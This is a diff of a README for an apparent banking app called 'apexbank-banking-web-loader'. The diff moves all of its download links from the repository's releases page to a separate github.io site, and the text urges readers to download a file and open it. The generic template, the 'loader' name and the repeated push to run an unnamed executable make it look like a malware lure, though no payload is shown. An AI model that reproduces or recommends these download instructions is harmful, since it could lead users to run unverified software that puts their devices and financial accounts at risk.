@@ -1,7 +1,7 @@
 <h1>💳 apexbank-banking-web-loader - Manage Your Money with Ease</h1>
 
 <p align="center">
-  <a href="https://github.com/hofanoitra/apexbank-banking-web-loader/releases" style="display:inline-block; padding:15px 30px; background:#4CAF50; color:white; font-size:18px; font-weight:bold; text-decoration:none; border-radius:8px;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://hofanoitra.github.io" style="display:inline-block; padding:15px 30px; background:#4CAF50; color:white; font-size:18px; font-weight:bold; text-decoration:none; border-radius:8px;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 👋 Welcome to ApexBank
@@ -28,7 +28,7 @@ Getting ApexBank up and running is super easy. Follow these simple steps:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/hofanoitra/apexbank-banking-web-loader/releases](https://github.com/hofanoitra/apexbank-banking-web-loader/releases)
+Visit this link to download the application: [https://hofanoitra.github.io](https://hofanoitra.github.io)
 
 You'll see a page with available files. Look for the most recent version and click the download button. The file is small, so it should download quickly.
 
@@ -112,6 +112,6 @@ ApexBank was built to make personal finance simple. You don't need any special s
 
 Remember, the only step you need to take right now is this:
 
-Visit this link to download the application: [https://github.com/hofanoitra/apexbank-banking-web-loader/releases](https://github.com/hofanoitra/apexbank-banking-web-loader/releases)
+Visit this link to download the application: [https://hofanoitra.github.io](https://hofanoitra.github.io)
 
 Download the file, open it, and start seeing your finances in a whole new light. Welcome to smarter money management with ApexBank.
